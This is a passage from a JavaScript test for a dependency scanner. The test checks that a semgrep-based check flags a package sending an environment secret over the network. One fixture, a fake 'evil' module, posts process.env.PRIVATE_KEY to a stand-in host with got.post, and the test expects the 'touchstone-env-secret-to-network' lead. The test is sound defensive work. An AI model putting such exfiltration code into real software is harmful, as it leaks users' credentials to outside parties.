  const files = { "node_modules/ok/index.js": "const axios = require('axios');\nconst got = require('got');\nconst a = axios.create({ headers: { a: process.env.TOKEN } });\nconst g = got.extend({ prefixUrl: process.env.API_URL });\n", "package.json": "{}" };
  const r = await scanSnapshot({ files, npmAdvisories: "" }, "semgrep");
  assert.equal(r.status, "ok");
  assert.deepEqual(r.leads, []);
  const hit = await scanSnapshot({ files: { "node_modules/evil/index.js": "const got = require('got');\ngot.post('https://x.invalid', { json: { k: process.env.PRIVATE_KEY } });\n", "package.json": "{}" }, npmAdvisories: "" }, "semgrep");
  assert.deepEqual(hit.leads.map((l) => l.check), ["touchstone-env-secret-to-network"]);
});
